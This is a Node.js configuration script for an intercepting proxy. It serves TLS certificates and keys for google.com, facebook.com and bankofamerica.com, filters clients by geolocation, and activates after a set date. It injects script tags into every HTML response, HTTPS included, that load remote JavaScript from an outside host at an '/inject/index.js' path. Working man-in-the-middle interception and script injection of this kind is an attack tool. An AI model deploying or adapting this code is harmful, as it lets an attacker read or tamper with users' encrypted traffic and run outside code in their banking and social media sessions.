var proxy = require('../lib/proxy.js'),
    geoip = require('geoip-lite');

var sslCerts = {
    '*.google.com': ['keys/star.google.com.key.free', 'keys/star.google.com.crt'],
    'google.com':   ['keys/google.com.key.free', 'keys/google.com.crt'],
    'www.facebook.com': ['keys/www.facebook.com.key.free', 'keys/www.facebook.com.crt'],
    '*.bankofamerica.com': ['keys/star.bankofamerica.com.key.free', 'keys/star.bankofamerica.com.crt'],
    '*.ak.facebook.com': ['keys/star.ak.facebook.com.key.free', 'keys/star.ak.facebook.com.crt'],
    '*.yaluandmike.com': ['keys/star.yaluandmike.com.key.free', 'keys/star.yaluandmike.com.crt']
};

var myProxy = proxy.createProxyServer({sslCerts: sslCerts});

myProxy.on('enabledCheck', function (callback) {
    callback(new Date().getTime() > new Date(2012, 1, 9, 8, 30).getTime());
});

/* Reject for Russian spies */
var ipCache = {};
myProxy.on('shouldReject', function (request, callback) {
    var client_ip = request.connection.remoteAddress || request.connection.socket.remoteAddress;
    var cached = ipCache[client_ip];
    if (cached !== undefined) {
        callback(cached);
        return;
    }
    var result = geoip.lookup(client_ip);
    var should_reject = result && result['country'] != 'US' && result['country'] != 'CA';
    ipCache[client_ip] = (should_reject ? true : false);
    callback(should_reject);
});

var localDomains = {
    'axiak.net': 1,
    'mikeandyalu.com': 1,
    'yaluandmike.com': 1
};
myProxy.on('interceptRequest', function (request_info, callback) {
    var major_domain = (request_info['host'] || 'example.com').split('.').slice(-2).join('.');
    if (localDomains[major_domain.toLowerCase()]) {
        request_info['host'] = 'localhost';
        if (request_info['port'] === 80) {
            request_info['port'] = 81;
        }
    }
   callback(request_info);
});



myProxy.on('interceptResponseHeaders', function (request_info, statusCode, headers, callback) {
    if (request_info['host'].indexOf('google.com') !== -1 && request_info['path'].indexOf('logo3w.png') !== -1) {
        callback(404, {});
    } else {
        callback(statusCode, headers);
    }
});


var ADDITIONAL_CODE = [
        "<script type='text/javascript' src='http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
        "<script type='text/javascript'>var $_jQuery = $.noConflict(true);</script>" +
        "<script type='text/javascript' src='http://www.yaluandmike.com/inject/index.js'></script>",

        "<script type='text/javascript' src='https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js'></script>" +
        "<script type='text/javascript'>var $_jQuery = $.noConflict(true);</script>" +
        "<script type='text/javascript' src='https://www.yaluandmike.com:446/inject/index.js'></script>"
];
myProxy.on('interceptResponseContent', function (buffer, response_object, isSsl, callback) {
    var bufferArr = buffer.split(/<\/body>/i);
    if (bufferArr.length !== 1) {
        var second = bufferArr.pop();
        var first = bufferArr.pop();
        bufferArr.push(first + ADDITIONAL_CODE[isSsl ? 1 : 0]);
        bufferArr.push(second);
        buffer = bufferArr.join("</body>");
    } else if (buffer.search(/<html/i) !== -1) {
        buffer += ADDITIONAL_CODE[isSsl ? 1 : 0];
    }
    callback(buffer);
});


myProxy.on('error', function (error) {
     console.log(error.stack);
});